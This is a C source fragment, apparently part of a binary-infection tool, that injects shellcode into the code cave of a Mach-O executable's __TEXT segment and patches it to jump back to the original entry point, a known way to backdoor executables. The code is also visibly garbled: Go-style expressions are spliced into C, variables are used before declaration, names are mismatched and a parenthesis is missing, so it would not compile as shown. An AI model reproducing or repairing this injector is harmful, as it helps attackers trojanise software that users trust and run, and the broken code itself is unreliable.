int binject_MACH-O(char *file,char *shellcode)
{
   uint32_t size;
   FILE *f;
  f=fopen(file,"r");
  fseek(f,0,SEEK_END);
   size=ftell(f);
   char *file_buffer = calloc(1,size);
	shellcodefixed = ApplySuffixJmpIntel64(shellcodeBytes, uint32(caveOffset), uint32(machoFile.EntryPoint), machoFile.ByteOrder)
				scfixedlen=strlen(shellcodefixed);
	uint32_t caveOffset,cave_len,a,b,c;
	caveOffset+= 0x20;
	caveOffset+=machoFile.FileHeader.Cmdsz
for(a=0;a<ncommands;a++)
 {
					load_command *cmd=(struct load_command*)address;
    for(b=0;b<sections;b++)
  {
     if (loadCommand->cmd == LC_SEGMENT)
        {
            struct segment_command *segmentCommand = (struct segment_command*)address;
            if (strncmp(segmentCommand->segname, "__TEXT", 16) == 0)
            {
                uint32_t *sectionAddress = address + sizeof(struct segment_command);
                struct section *sectionCommand = NULL; 
                for (c = 0; c < segmentCommand->nsects; c++)
                {
			sectionCommand = (struct section*)(sectionAddress);
                    if (strncmp(sectionCommand->sectname, "__text", 16) == 0)
                    {
                      
			if(scfixedlen<sectionCommand->offset-caveOffset)
			{
				memcpy(buf+cave_offset,shellcodefixed,strlen(shellcodefixed);
				 fwrite(buf,1,size,f);
			break;
		        }    
                    }
                    sectionAddress += sizeof(struct section);
                }
            }
          }
     
   }
				       address+=cmd->cmdsize;
 }                
return -1;				       
}
